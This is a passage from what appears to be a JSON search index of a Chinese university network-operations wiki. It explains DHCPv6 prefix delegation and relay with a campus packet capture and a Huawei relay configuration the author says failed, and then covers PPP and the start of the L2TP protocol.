\u5730\u5740\u6269\u5c55\u6027\u4e0d\u597d\uff0c\u4e0d\u5229\u4e8e IPv6 \u5730\u5740\u7684\u7edf\u4e00\u89c4\u5212\u7ba1\u7406\u3002</p> <p>\u901a\u8fc7 DHCPv6 \u524d\u7f00\u4ee3\u7406\u673a\u5236\uff0c\u4e0b\u6e38\u7f51\u7edc\u8bbe\u5907\u4e0d\u9700\u8981\u518d\u624b\u5de5\u6307\u5b9a\u7528\u6237\u4fa7\u94fe\u8def\u7684 IPv6 \u5730\u5740\u524d\u7f00\uff0c\u5b83\u53ea\u9700\u8981\u5411\u4e0a\u6e38\u7f51\u7edc\u8bbe\u5907\u63d0\u51fa\u524d\u7f00\u5206\u914d\u7533\u8bf7\uff0c\u4e0a\u6e38\u7f51\u7edc\u8bbe\u5907\u4fbf\u53ef\u4ee5\u5206\u914d\u5408\u9002\u7684\u5730\u5740\u524d\u7f00\u7ed9\u4e0b\u6e38\u8bbe\u5907\uff0c\u4e0b\u6e38\u8bbe\u5907\u628a\u83b7\u5f97\u7684\u524d\u7f00 (\u4e00\u822c\u524d\u7f00\u957f\u5ea6\u5c0f\u4e8e 64) \u8fdb\u4e00\u6b65\u81ea\u52a8\u7ec6\u5206\u6210 64 \u524d\u7f00\u957f\u5ea6\u7684\u5b50\u7f51\u7f51\u6bb5\uff0c\u628a\u7ec6\u5206\u7684\u5730\u5740\u524d\u7f00\u518d\u901a\u8fc7\u8def\u7531\u901a\u544a (RA) \u81f3\u4e0e IPv6 \u4e3b\u673a\u76f4\u8fde\u7684\u7528\u6237\u94fe\u8def\u4e0a\uff0c\u5b9e\u73b0 IPv6 \u4e3b\u673a\u7684\u5730\u5740\u81ea\u52a8\u914d\u7f6e\uff0c\u5b8c\u6210\u6574\u4e2a\u7cfb\u7edf\u5c42\u6b21\u7684\u5730\u5740\u5e03\u5c40\u3002</p>      DHCPv6 PD \u5de5\u4f5c\u539f\u7406      <p>DHCPv6 PD \u7684\u5de5\u4f5c\u65b9\u5f0f\u4e0e DHCPv6 \u6709\u72b6\u6001\u81ea\u52a8\u5206\u914d\u7c7b\u4f3c\uff0c\u652f\u6301\u56db\u6b65\u6216\u4e24\u6b65\u4ea4\u4e92\uff0c\u53ea\u662f DHCPv6 \u62a5\u6587\u4e2d\u5305\u542b PD \u524d\u7f00\u4fe1\u606f\u3002</p>","tags":["stable"]},{"location":"operation/network/network-technology/ipv6/#dhcpv6-\u4e2d\u7ee7\u5de5\u4f5c\u539f\u7406","title":"DHCPv6 \u4e2d\u7ee7\u5de5\u4f5c\u539f\u7406","text":"<p>DHCPv6 \u5ba2\u6237\u7aef\u901a\u8fc7 DHCPv6 \u4e2d\u7ee7\u8f6c\u53d1\u62a5\u6587\uff0c\u83b7\u53d6 IPv6 \u5730\u5740/\u524d\u7f00\u548c\u5176\u4ed6\u7f51\u7edc\u914d\u7f6e\u53c2\u6570\uff08\u4f8b\u5982 DNS \u670d\u52a1\u5668\u7684 IPv6 \u5730\u5740\u7b49\uff09\u3002</p>      DHCPv6 \u4e2d\u7ee7\u5de5\u4f5c\u539f\u7406      <p>DHCPv6 \u4e2d\u7ee7\u5de5\u4f5c\u4ea4\u4e92\u8fc7\u7a0b\u5982\u4e0b\uff1a</p> <ol> <li>DHCPv6 \u5ba2\u6237\u7aef\u5411\u6240\u6709 DHCPv6 \u670d\u52a1\u5668\u548c DHCPv6 \u4e2d\u7ee7\u53d1\u9001\u76ee\u7684\u5730\u5740\u4e3a FF02::1:2\uff08\u7ec4\u64ad\u5730\u5740\uff09\u7684\u8bf7\u6c42\u62a5\u6587\u3002</li> <li>\u6839\u636e DHCPv6 \u4e2d\u7ee7\u8f6c\u53d1\u62a5\u6587\u6709\u5982\u4e0b\u4e24\u79cd\u60c5\u51b5\uff1a<ul> <li>\u5982\u679c DHCPv6 \u4e2d\u7ee7\u548c DHCPv6 \u5ba2\u6237\u7aef\u4f4d\u4e8e\u540c\u4e00\u4e2a\u94fe\u8def\u4e0a\uff0c\u5373 DHCPv6 \u4e2d\u7ee7\u4e3a DHCPv6 \u5ba2\u6237\u7aef\u7684\u7b2c\u4e00\u8df3\u4e2d\u7ee7\uff0c\u4e2d\u7ee7\u8f6c\u53d1\u76f4\u63a5\u6765\u81ea\u5ba2\u6237\u7aef\u7684\u62a5\u6587\uff0c\u6b64\u65f6 DHCPv6 \u4e2d\u7ee7\u5b9e\u8d28\u4e0a\u4e5f\u662f\u5ba2\u6237\u7aef\u7684 IPv6 \u7f51\u5173\u8bbe\u5907\u3002DHCPv6 \u4e2d\u7ee7\u6536\u5230\u5ba2\u6237\u7aef\u7684\u62a5\u6587\u540e\uff0c\u5c06\u5176\u5c01\u88c5\u5728 Relay-Forward \u62a5\u6587\u7684\u4e2d\u7ee7\u6d88\u606f\u9009\u9879\uff08Relay Message Option\uff09\u4e2d\uff0c\u5e76\u5c06 Relay-Forward \u62a5\u6587\u53d1\u9001\u7ed9 DHCPv6 \u670d\u52a1\u5668\u6216\u4e0b\u4e00\u8df3\u4e2d\u7ee7\u3002</li> <li>\u5982\u679c DHCPv6 \u4e2d\u7ee7\u548c DHCPv6 \u5ba2\u6237\u7aef\u4e0d\u5728\u540c\u4e00\u4e2a\u94fe\u8def\u4e0a\uff0c\u4e2d\u7ee7\u6536\u5230\u7684\u62a5\u6587\u662f\u6765\u81ea\u5176\u4ed6\u4e2d\u7ee7\u7684 Relay-Forward \u62a5\u6587\u3002\u4e2d\u7ee7\u6784\u9020\u4e00\u4e2a\u65b0\u7684 Relay-Forward \u62a5\u6587\uff0c\u5e76\u5c06 Relay-Forward \u62a5\u6587\u53d1\u9001\u7ed9 DHCPv6 \u670d\u52a1\u5668\u6216\u4e0b\u4e00\u8df3\u4e2d\u7ee7\u3002</li> </ul> </li> <li>DHCPv6 \u670d\u52a1\u5668\u4ece Relay-Forward \u62a5\u6587\u4e2d\u89e3\u6790\u51fa DHCPv6 \u5ba2\u6237\u7aef\u7684\u8bf7\u6c42\uff0c\u4e3a DHCPv6 \u5ba2\u6237\u7aef\u9009\u53d6 IPv6 \u5730\u5740\u548c\u5176\u4ed6\u914d\u7f6e\u53c2\u6570\uff0c\u6784\u9020\u5e94\u7b54\u6d88\u606f\uff0c\u5c06\u5e94\u7b54\u6d88\u606f\u5c01\u88c5\u5728 Relay-Reply \u62a5\u6587\u7684\u4e2d\u7ee7\u6d88\u606f\u9009\u9879\u4e2d\uff0c\u5e76\u5c06 Relay-Reply \u62a5\u6587\u53d1\u9001\u7ed9 DHCPv6 \u4e2d\u7ee7\u3002</li> <li>DHCPv6 \u4e2d\u7ee7\u4ece Relay-Reply \u62a5\u6587\u4e2d\u89e3\u6790\u51fa DHCPv6 \u670d\u52a1\u5668\u7684\u5e94\u7b54\uff0c\u8f6c\u53d1\u7ed9 DHCPv6 \u5ba2\u6237\u7aef\u3002\u5982\u679c DHCPv6 \u5ba2\u6237\u7aef\u63a5\u6536\u5230\u591a\u4e2a DHCPv6 \u670d\u52a1\u5668\u7684\u5e94\u7b54\uff0c\u5219\u6839\u636e\u62a5\u6587\u4e2d\u7684\u670d\u52a1\u5668\u4f18\u5148\u7ea7\u9009\u62e9\u4e00\u4e2a DHCPv6 \u670d\u52a1\u5668\uff0c\u540e\u7eed\u4ece\u8be5 DHCPv6 \u670d\u52a1\u5668\u83b7\u53d6 IPv6 \u5730\u5740\u548c\u5176\u4ed6\u7f51\u7edc\u914d\u7f6e\u53c2\u6570\u3002</li> </ol>","tags":["stable"]},{"location":"operation/network/network-technology/ipv6/#dhcpv6-\u5b9e\u8df5","title":"DHCPv6 \u5b9e\u8df5","text":"","tags":["stable"]},{"location":"operation/network/network-technology/ipv6/#\u6821\u56ed\u7f51\u6709\u72b6\u6001-dhcpv6","title":"\u6821\u56ed\u7f51\u6709\u72b6\u6001 DHCPv6","text":"<p>\u76ee\u524d\uff0c\u7389\u6cc9\u6821\u533a 32 \u820d\u6709\u7ebf\u7f51\u7edc\u91c7\u7528 DHCPv6 \u6709\u72b6\u6001\u914d\u7f6e\uff0c\u8ba9\u6211\u4eec\u6765\u770b\u4e00\u4e0b DHCPv6 \u6709\u72b6\u6001\u914d\u7f6e\u7684\u8fc7\u7a0b\u3002</p>      WireShark \u6293\u53d6\u5230\u7684 DHCPv6 \u62a5\u6587      <p>\u4e0a\u56fe\u5c55\u793a\u4e86\u5728\u6821\u56ed\u7f51\u6293\u5305\u65f6\u6355\u83b7\u5230\u7684 DHCPv6 \u62a5\u6587\u3002\u53ef\u4ee5\u770b\u5230\u8bbe\u5907\u63a5\u5165\u7f51\u7edc\u540e\u9996\u5148\u53d1\u9001 RS \u62a5\u6587\u5c1d\u8bd5\u8fdb\u884c SLAAC \u914d\u7f6e\uff0c\u6ca1\u6709\u5e94\u7b54\u3002\u4f7f\u80fd\u8bbe\u5907\u7684 DHCPv6 \u5ba2\u6237\u7aef\u529f\u80fd\uff0c\u8bbe\u5907\u5411\u7ec4\u64ad\u5730\u5740 <code>FF02::1:2</code> \u53d1\u9001 DHCPv6 Solicit \u62a5\u6587\uff08\u8fd8\u8bb0\u5f97\u8fd9\u4e2a\u7ec4\u64ad\u5730\u5740\u4ee3\u8868\u4ec0\u4e48\u5417\uff1f\uff09\u5c1d\u8bd5\u8fdb\u884c DHCPv6 \u6709\u72b6\u6001\u914d\u7f6e\u3002\u5c40\u57df\u7f51\u4e2d\u7684 DHCPv6 \u670d\u52a1\u5668\u63a5\u6536\u5230 Solicit \u62a5\u6587\u540e\uff0c\u5411\u8bbe\u5907\u53d1\u9001 Advertise \u62a5\u6587\uff0c\u5176\u4e2d\u5305\u542b IA Address \u5373\u4e3a\u670d\u52a1\u5668\u5206\u914d\u7ed9\u5ba2\u6237\u7aef\u7684 IPv6 \u5730\u5740\u3002\u968f\u540e\u7684 Request \u548c Reply \u5b8c\u6210 DHCPv6 \u914d\u7f6e\u3002</p> <p>\u8ba9\u6211\u4eec\u770b\u770b Advertise \u62a5\u6587\u7684\u8be6\u7ec6\u5185\u5bb9\uff1a</p> <pre><code>DHCPv6\n    Message type: Advertise (2)\n    Transaction ID: 0x8ed327\n    Identity Association for Non-temporary Address\n        Option: Identity Association for Non-temporary Address (3)\n        Length: 40\n        IAID: 00000002\n        T1: 302400\n        T2: 483840\n        IA Address\n            Option: IA Address (5)\n            Length: 24\n            IPv6 address: ****:****:****:****:****:****:****:****\n            Preferred lifetime: 604800\n            Valid lifetime: 2592000\n    Client Identifier\n    Server Identifier\n</code></pre>","tags":["stable"]},{"location":"operation/network/network-technology/ipv6/#\u534e\u4e3a\u8def\u7531\u5668\u914d\u7f6e-ipv6-\u4e2d\u7ee7","title":"\u534e\u4e3a\u8def\u7531\u5668\u914d\u7f6e IPv6 \u4e2d\u7ee7","text":"<p>\u5728\u4e0a\u4e00\u8282\u6211\u4eec\u5df2\u7ecf\u770b\u5230\uff0c\u6821\u56ed\u7f51 DHCPv6 \u4e0b\u53d1\u7684 IPv6 \u5730\u5740\u524d\u7f00\u4e3a 128 \u4f4d\uff0c\u8fd9\u6837\u7684\u5730\u5740\u8fde DHCPv6 \u4e2d\u7ee7\u90fd\u65e0\u6cd5\u914d\u7f6e\u3002\u56e0\u6b64\u672c\u8282\u5185\u5bb9\u5728\u6821\u56ed\u7f51\u6ca1\u4ec0\u4e48\u7528\uff0c\u4ec5\u4f5c\u4e3a\u4e00\u6b21\u5c1d\u8bd5\u7684\u8bb0\u5f55\u3002</p> <pre><code># \u914d\u7f6e DHCPv6 \u670d\u52a1\u5668\u7ec4\ndhcpv6 server group zju\n# \u5728\u8fd9\u4e00\u6b65\u5931\u8d25\u4e86\uff0c\u65e0\u6cd5\u83b7\u77e5\u6821\u56ed\u7f51 DHCPv6 \u670d\u52a1\u5668\u7684\u5168\u7403\u5355\u64ad\u5730\u5740\ndhcpv6-server ???????\nquit\n# \u5728 VLANIF \u63a5\u53e3\u4e0a\u914d\u7f6e DHCPv6 \u4e2d\u7ee7\ninterface vlanif 1\ndhcpv6 relay server-select zju\n# \u914d\u7f6e\u90bb\u5c45\u53d1\u73b0\u62a5\u6587\u4e2d\u7684\u6807\u5fd7\uff0c\u4ee5\u544a\u77e5\u542f\u7528 DHCPv6 \u6709\u72b6\u6001\u914d\u7f6e\nipv6 nd autoconfig managed-address-flag\nipv6 nd autoconfig other-flag\n</code></pre>","tags":["stable"]},{"location":"operation/network/network-technology/l2tp/","title":"L2TP","text":"","tags":["stable"]},{"location":"operation/network/network-technology/l2tp/#l2tp","title":"L2TP","text":"<p>Quote</p> <ul> <li>L2TP \u914d\u7f6e - \u534e\u4e3a</li> <li>L2TP Tunnel Setup and Teardown - Cisco</li> <li>L2TP \u63a5\u5165\u7279\u6027\u63cf\u8ff0 - \u534e\u4e3a</li> </ul> <p>\u4e8c\u5c42\u96a7\u9053\u534f\u8bae\uff08Layer 2 Tunneling Protocol\uff0cL2TP\uff09\u662f\u865a\u62df\u79c1\u6709\u62e8\u53f7\u7f51\uff08Virtual Private Dial-up Network\uff0cVPDN\uff09\u96a7\u9053\u534f\u8bae\u7684\u4e00\u79cd\u3002L2TP \u534f\u8bae\u63d0\u4f9b\u4e86\u5bf9 PPP \u94fe\u8def\u5c42\u6570\u636e\u5305\u7684\u96a7\u9053\uff08Tunnel\uff09\u4f20\u8f93\u652f\u6301\uff0c\u5141\u8bb8\u4e8c\u5c42\u94fe\u8def\u7aef\u70b9\u548c PPP \u4f1a\u8bdd\u70b9\u9a7b\u7559\u5728\u4e0d\u540c\u8bbe\u5907\u4e0a\uff0c\u5e76\u91c7\u7528\u5305\u4ea4\u6362\u6280\u672f\u8fdb\u884c\u4fe1\u606f\u4ea4\u4e92\uff0c\u4ece\u800c\u6269\u5c55\u4e86 PPP \u6a21\u578b\u3002L2TP \u529f\u80fd\u53ef\u4ee5\u7b80\u5355\u63cf\u8ff0\u4e3a\u5728\u975e\u70b9\u5bf9\u70b9\u7684\u7f51\u7edc\u4e0a\u5efa\u7acb\u70b9\u5bf9\u70b9\u7684 PPP \u4f1a\u8bdd\u8fde\u63a5\u3002L2TP \u534f\u8bae\u7ed3\u5408\u4e86\u4e8c\u5c42\u8f6c\u53d1\u534f\u8bae\uff08Layer 2 Forwarding\uff0cL2F\uff09\u534f\u8bae\u548c\u70b9\u5bf9\u70b9\u96a7\u9053\u534f\u8bae\uff08Point-to-Point Tunneling protocol\uff0cPPTP\uff09\u534f\u8bae\u7684\u4f18\u70b9\uff0c\u6210\u4e3a IETF \u6709\u5173\u4e8c\u5c42\u96a7\u9053\u534f\u8bae\u7684\u5de5\u4e1a\u6807\u51c6\u3002</p> <p>L2TP \u662f\u5e94\u7528\u4e8e\u8fdc\u7a0b\u529e\u516c\u573a\u666f\u4e2d\u4e3a\u51fa\u5dee\u5458\u5de5\u8fdc\u7a0b\u8bbf\u95ee\u4f01\u4e1a\u5185\u7f51\u8d44\u6e90\u63d0\u4f9b\u63a5\u5165\u670d\u52a1\u7684\u4e00\u79cd\u91cd\u8981 VPN \u6280\u672f\u3002\u4f20\u7edf\u7684\u62e8\u53f7\u7f51\u7edc\u9700\u8981\u79df\u7528\u56e0\u7279\u7f51\u670d\u52a1\u63d0\u4f9b\u5546\uff08Internet Service Provider\uff0cISP\uff09\u7684\u7535\u8bdd\u7ebf\u8def\uff0c\u7533\u8bf7\u516c\u5171\u7684\u53f7\u7801\u6216 IP \u5730\u5740\uff0c\u4e0d\u4ec5\u4ea7\u751f\u9ad8\u989d\u7684\u8d39\u7528\uff0c\u800c\u4e14\u65e0\u6cd5\u4e3a\u8fdc\u7a0b\u7528\u6237\u5c24\u5176\u662f\u51fa\u5dee\u5458\u5de5\u63d0\u4f9b\u4fbf\u5229\u7684\u63a5\u5165\u670d\u52a1\u3002L2TP \u6280\u672f\u51fa\u73b0\u4ee5\u540e\uff0c\u4f7f\u7528 L2TP \u96a7\u9053\u627f\u8f7d PPP \u62a5\u6587\u5728 Internet \u4e0a\u4f20\u8f93\u6210\u4e3a\u4e86\u89e3\u51b3\u4e0a\u8ff0\u95ee\u9898\u7684\u4e00\u79cd\u9014\u5f84\u3002\u65e0\u8bba\u51fa\u5dee\u5458\u5de5\u662f\u901a\u8fc7\u4f20\u7edf\u62e8\u53f7\u65b9\u5f0f\u63a5\u5165 Internet\uff0c\u8fd8\u662f\u901a\u8fc7\u4ee5\u592a\u7f51\u65b9\u5f0f\u63a5\u5165 Internet\uff0cL2TP \u90fd\u53ef\u4ee5\u63d0\u4f9b\u8fdc\u7a0b\u63a5\u5165\u670d\u52a1\u3002</p> <p>\u5728\u4e86\u89e3 L2TP \u4e4b\u524d\uff0c\u5148\u8ba9\u6211\u4eec\u6765\u4e86\u89e3\u4e00\u4e0b PPP \u534f\u8bae\u3002</p>","tags":["stable"]},{"location":"operation/network/network-technology/l2tp/#ppp-\u539f\u7406","title":"PPP \u539f\u7406","text":"<p>\u70b9\u5bf9\u70b9\u534f\u8bae\uff08Point-to-Point Protocol\uff0cPPP\uff09</p> <p>Quote</p> <ul> <li>RFC 1661 - The Point-to-Point Protocol (PPP)</li> <li>1. Intro to the Point to Point Protocol PPP - YouTube</li> <li>PPP \u914d\u7f6e - \u534e\u4e3a</li> <li>PPP - WireShark</li> </ul> <p>PPP \u8bde\u751f\u7684\u76ee\u7684\u662f\u4e3a\u4e86\u5c01\u88c5\u4e09\u5c42\u7f51\u7edc\u534f\u8bae\uff0c\u4f7f\u5f97\u4e24\u4e2a\u8282\u70b9\u4e4b\u95f4\u7684\u901a\u4fe1\u53ef\u4ee5\u8de8\u8d8a\u4e0d\u540c\u7684\u7269\u7406\u94fe\u8def\u3002</p>","tags":["stable"]},{"location":"operation/network/network-technology/l2tp/#ppp-\u7ec4\u6210\u90e8\u5206","title":"PPP \u7ec4\u6210\u90e8\u5206","text":"<p>PPP \u7531\u4e24\u4e2a\u90e8\u5206\u7ec4\u6210\uff1a</p> <ul> <li>\u94fe\u8def\u63a7\u5236\u534f\u8bae\uff08Link Control Protocol\uff0cLCP\uff09\uff1a\u5efa\u7acb\u3001\u914d\u7f6e\u3001\u6d4b\u8bd5\u94fe\u8def\u3002\u5305\u62ec\u8ba4\u8bc1\u3001\u9519\u8bef\u68c0\u6d4b\u3001\u591a\u8def\u590d\u7528\u3001\u73af\u56de\u68c0\u6d4b\u7b49\u529f\u80fd\u3002</li> <li>\u7f51\u7edc\u63a7\u5236\u534f\u8bae\uff08Network Control Protocol\uff0cNCP\uff09\uff1a\u914d\u7f6e\u7f51\u7edc\u5c42\u534f\u8bae\u3002\u5bf9\u4e8e PPP \u5c01\u88c5\u7684\u6bcf\u4e00\u79cd\u7f51\u7edc\u5c42\u534f\u8bae\uff0c\u90fd\u9700\u8981\u4e00\u4e2a NCP\u3002\u6bd4\u5982\u5bf9\u4e8e IPv4 \u662f IPCP\uff0c\u5bf9\u4e8e IPv6 \u662f IPv6CP\u3002</li> </ul>      PPP \u534f\u8bae\u6808      Wikipedia, Huawei","tags":["stable"]},{"location":"operation/network/network-technology/l2tp/#ppp-\u5e27\u683c\u5f0f","title":"PPP \u5e27\u683c\u5f0f","text":"PPP \u5e27\u683c\u5f0f      GeeksforGeeks","tags":["stable"]},{"location":"operation/network/network-technology/l2tp/#lcp","title":"LCP","text":"<p>Quote</p> <ul> <li>Protocols/lcp - WireShark</li> <li>PPP Link Control Protocol (LCP) - Huawei</li> </ul> <p>\u5f53 PPP \u5e27 Protocol \u5b57\u6bb5\u4e3a <code>0xC021</code> \u65f6\uff0c\u8868\u793a LCP \u534f\u8bae\u3002</p>      LCP \u65f6\u5e8f\u56fe      The TCP/IP Guide      LCP \u72b6\u6001\u56fe      The TCP/IP Guide","tags":["stable"]},{"location":"operation/network/network-technology/l2tp/#chap","title":"CHAP","text":"<p>\u6311\u6218 - \u5e94\u7b54\u8ba4\u8bc1\u534f\u8bae\uff08Challenge-Handshake Authentication Protocol\uff0cCHAP\uff09</p> <p>Quote</p> <ul> <li>RFC 1994 - PPP Challenge Handshake Authentication Protocol (CHAP)</li> </ul> <p>CHAP \u9a8c\u8bc1\u534f\u8bae\u4e3a\u4e09\u6b21\u63e1\u624b\u9a8c\u8bc1\u534f\u8bae\u3002\u5b83\u53ea\u5728\u7f51\u7edc\u4e0a\u4f20\u8f93\u7528\u6237\u540d\uff0c\u800c\u5e76\u4e0d\u4f20\u8f93\u7528\u6237\u5bc6\u7801\uff0c\u56e0\u6b64\u5b89\u5168\u6027\u8981\u6bd4 PAP \u9ad8\u3002</p>      CHAP \u65f6\u5e8f\u56fe      Huawei","tags":["stable"]},{"location":"operation/network/network-technology/l2tp/#ipcp","title":"IPCP","text":"<p>IP \u63a7\u5236\u534f\u8bae\uff08IP Control Protocol\uff0cIPCP\uff09</p> <p>Quote</p> <ul> <li>RFC 1332 - The PPP Internet Protocol Control Protocol (IPCP)</li> </ul> <p>IPCP \u662f PPP \u7684\u4e00\u4e2a NCP\uff0c\u7528\u4e8e\u914d\u7f6e IPv4 \u534f\u8bae\u3002\u534f\u5546\u5185\u5bb9\u5305\u62ec IP \u5730\u5740\u3001DNS \u670d\u52a1\u5668\u5730\u5740\u7b49\u3002</p>      IPCP \u65f6\u5e8f\u56fe      The TCP/IP Guide","tags":["stable"]},{"location":"operation/network/network-technology/l2tp/#ppp-\u5efa\u94fe\u8fc7\u7a0b","title":"PPP \u5efa\u94fe\u8fc7\u7a0b","text":"PPP \u72b6\u6001\u56fe      Huawei <p>PPP \u8fd0\u884c\u7684\u8fc7\u7a0b\u7b80\u5355\u63cf\u8ff0\u5982\u4e0b\uff1a</p> <ol> <li>\u901a\u4fe1\u53cc\u65b9\u5f00\u59cb\u5efa\u7acb PPP \u94fe\u8def\u65f6\uff0c\u5148\u8fdb\u5165\u5230 Establish \u9636\u6bb5\u3002</li> <li>\u5728 Establish \u9636\u6bb5\uff0cPPP \u94fe\u8def\u8fdb\u884c LCP \u534f\u5546\u3002\u534f\u5546\u5185\u5bb9\u5305\u62ec\u5de5\u4f5c\u65b9\u5f0f\u662f SP\uff08Single-link PPP\uff09\u8fd8\u662f MP\uff08Multilink PPP\uff09\u3001\u6700\u5927\u63a5\u6536\u5355\u5143 MRU\uff08Maximum Receive Unit\uff09\u3001\u9a8c\u8bc1\u65b9\u5f0f\u548c\u9b54\u672f\u5b57\uff08magic number\uff09\u7b49\u9009\u9879\u3002LCP \u534f\u5546\u6210\u529f\u540e\u8fdb\u5165 Opened \u72b6\u6001\uff0c\u8868\u793a\u5e95\u5c42\u94fe\u8def\u5df2\u7ecf\u5efa\u7acb\u3002</li> <li>\u5982\u679c\u914d\u7f6e\u4e86\u9a8c\u8bc1\uff0c\u5c06\u8fdb\u5165 Authenticate \u9636\u6bb5\uff0c\u5f00\u59cb CHAP \u6216 PAP \u9a8c\u8bc1\u3002\u5982\u679c\u6ca1\u6709\u914d\u7f6e\u9a8c\u8bc1\uff0c\u5219\u76f4\u63a5\u8fdb\u5165 Network \u9636\u6bb5\u3002</li> <li>\u5728 Authenticate \u9636\u6bb5\uff0c\u5982\u679c\u9a8c\u8bc1\u5931\u8d25\uff0c\u8fdb\u5165 Terminate \u9636\u6bb5\uff0c\u62c6\u9664\u94fe\u8def\uff0cLCP \u72b6\u6001\u8f6c\u4e3a Down\u3002\u5982\u679c\u9a8c\u8bc1\u6210\u529f\uff0c\u8fdb\u5165 Network \u9636\u6bb5\uff0c\u6b64\u65f6 LCP \u72b6\u6001\u4ecd\u4e3a Opened\u3002</li> <li>\u5728 Network \u9636\u6bb5\uff0cPPP \u94fe\u8def\u8fdb\u884c NCP \u534f\u5546\u3002\u901a\u8fc7 NCP \u534f\u5546\u6765\u9009\u62e9\u548c\u914d\u7f6e\u4e00\u4e2a\u7f51\u7edc\u5c42\u534f\u8bae\u5e76\u8fdb\u884c\u7f51\u7edc\u5c42\u53c2\u6570\u534f\u5546\u3002\u53ea\u6709\u76f8\u5e94\u7684\u7f51\u7edc\u5c42\u534f\u8bae\u534f\u5546\u6210\u529f\u540e\uff0c\u8be5\u7f51\u7edc\u5c42\u534f\u8bae\u624d\u53ef\u4ee5\u901a\u8fc7\u8fd9\u6761 PPP \u94fe\u8def\u53d1\u9001\u62a5\u6587\u3002</li> <li>NCP \u534f\u5546\u5305\u62ec IPCP\uff08IP Control Protocol\uff09\u3001MPLSCP\uff08MPLS Control Protocol\uff09\u7b49\u534f\u5546\u3002IPCP \u534f\u5546\u5185\u5bb9\u4e3b\u8981\u5305\u62ec\u53cc\u65b9\u7684 IP \u5730\u5740\u3002</li> <li>NCP \u534f\u5546\u6210\u529f\u540e\uff0cPPP \u94fe\u8def\u5c06\u4e00\u76f4\u4fdd\u6301\u901a\u4fe1\u3002PPP \u8fd0\u884c\u8fc7\u7a0b\u4e2d\uff0c\u53ef\u4ee5\u968f\u65f6\u4e2d\u65ad\u8fde\u63a5\uff0c\u7269\u7406\u94fe\u8def\u65ad\u5f00\u3001\u8ba4\u8bc1\u5931\u8d25\u3001\u8d85\u65f6\u5b9a\u65f6\u5668\u65f6\u95f4\u5230\u3001\u7ba1\u7406\u5458\u901a\u8fc7\u914d\u7f6e\u5173\u95ed\u8fde\u63a5\u7b49\u52a8\u4f5c\u90fd\u53ef\u80fd\u5bfc\u81f4\u94fe\u8def\u8fdb\u5165 Terminate \u9636\u6bb5\u3002</li> <li>\u5728 Terminate \u9636\u6bb5\uff0c\u5982\u679c\u6240\u6709\u7684\u8d44\u6e90\u90fd\u88ab\u91ca\u653e\uff0c\u901a\u4fe1\u53cc\u65b9\u5c06\u56de\u5230 Dead \u9636\u6bb5\uff0c\u76f4\u5230\u901a\u4fe1\u53cc\u65b9\u91cd\u65b0\u5efa\u7acb PPP \u8fde\u63a5\uff0c\u5f00\u59cb\u65b0\u7684 PPP \u94fe\u8def\u5efa\u7acb\u3002</li> </ol>","tags":["stable"]},{"location":"operation/network/network-technology/l2tp/#l2tp-\u539f\u7406","title":"L2TP \u539f\u7406","text":"","tags":["stable"]},{"location":"operation/network/network-technology/l2tp/#l2tp-\u7ec4\u6210\u90e8\u5206","title":"L2TP \u7ec4\u6210\u90e8\u5206","text":"<ul> <li>PPP \u7ec8\u7aef\uff1aL2TP \u5e94\u7528\u4e2d\uff0cPPP \u7ec8\u7aef\u6307\u53d1\u8d77\u62e8\u53f7\uff0c\u5c06\u6570\u636e\u5c01\u88c5\u4e3a PPP \u7c7b\u578b\u7684\u8bbe\u5907\uff0c\u5982\u8fdc\u7a0b\u7528\u6237 PC\u3001\u4f01\u4e1a\u5206\u652f\u7f51\u5173\u7b49\u5747\u53ef\u4f5c\u4e3a PPP \u7ec8\u7aef\u3002</li> <li>L2TP \u8bbf\u95ee\u96c6\u4e2d\u5668\uff08L2TP Access Concentrator\uff0cLAC\uff09\uff1a\u4ea4\u6362\u7f51\u7edc\u4e0a\u5177\u6709 PPP \u548c L2TP \u534f\u8bae\u5904\u7406\u80fd\u529b\u7684\u8bbe\u5907\u3002LAC \u6839\u636e PPP \u62a5\u6587\u4e2d\u6240\u643a\u5e26\u7684\u7528\u6237\u540d\u6216\u8005\u57df\u540d\u4fe1\u606f\uff0c\u548c LNS \u5efa\u7acb L2TP \u96a7\u9053\u8fde\u63a5\uff0c\u5c06 PPP \u534f\u5546\u5ef6\u5c55\u5230 LNS\u3002<ul> <li>NAS-Initiated \u573a\u666f\uff1a\u5728\u4f20\u7edf\u7684\u62e8\u53f7\u7f51\u7edc\u4e2d\uff0cISP \u5728 NAS \u4e0a\u90e8\u7f72 LAC\uff0c\u6216\u5728\u4f01\u4e1a\u5206\u652f\u7684\u4ee5\u592a\u7f51\u7edc\u4e2d\uff0c\u4e3a PPP \u7ec8\u7aef\u914d\u5907\u7f51\u5173\u8bbe\u5907\uff0c\u7f51\u5173\u4f5c\u4e3a PPPoE \u670d\u52a1\u5668\uff0c\u540c\u65f6\u90e8\u7f72\u4e3a LAC\u3002</li> <li>L2TP Client-Initiated \u573a\u666f\uff1a\u4f01\u4e1a\u5206\u652f\u5728\u7f51\u5173\u8bbe\u5907\u914d\u7f6e\u53ef\u4ee5\u4e3b\u52a8\u5411 LNS \u53d1\u8d77 L2TP \u96a7\u9053\u8fde\u63a5\u8bf7\u6c42\u7684 L2TP Client\uff0c\u4e0d\u9700\u8981\u8fdc\u7aef\u7cfb\u7edf\u62e8\u53f7\u89e6\u53d1\uff0cL2TP Client \u4e3a LAC\u3002</li> <li>Client-Initiated \u573a\u666f\uff1a\u51fa\u5dee\u4eba\u5458\u4f7f\u7528 PC \u6216\u79fb\u52a8\u7ec8\u7aef\u63a5\u5165 Internet\uff0c\u5728 PC \u6216\u79fb\u52a8\u7ec8\u7aef\u4e0a\u4f7f\u7528 L2TP \u62e8\u53f7\u8f6f\u4ef6\uff0c\u5219 PC \u6216\u79fb\u52a8\u7ec8\u7aef\u7ec8\u7aef\u4e3a LAC\u3002</li> <li>LAC \u53ef\u4ee5\u53d1\u8d77\u5efa\u7acb\u591a\u6761 L2TP \u96a7\u9053\u4f7f\u6570\u636e\u6d41\u4e4b\u95f4\u76f8\u4e92\u9694\u79bb\u3002</li> </ul> </li> <li>L2TP \u7f51\u7edc\u670d\u52a1\u5668\uff08L2TP Network Server\uff0cLNS\uff09\uff1a\u7ec8\u6b62 PPP \u4f1a\u8bdd\u7684\u4e00\u7aef\uff0c\u901a\u8fc7 LNS \u7684\u8ba4\u8bc1\uff0cPPP \u4f1a\u8bdd\u534f\u5546\u6210\u529f\uff0c\u8fdc\u7a0b\u7528\u6237\u53ef\u4ee5\u8bbf\u95ee\u4f01\u4e1a\u603b\u90e8\u7684\u8d44\u6e90\u3002\u5bf9 L2TP \u534f\u5546\uff0cLNS \u662f LAC \u7684\u5bf9\u7aef\u8bbe\u5907\uff0c\u5373 LAC 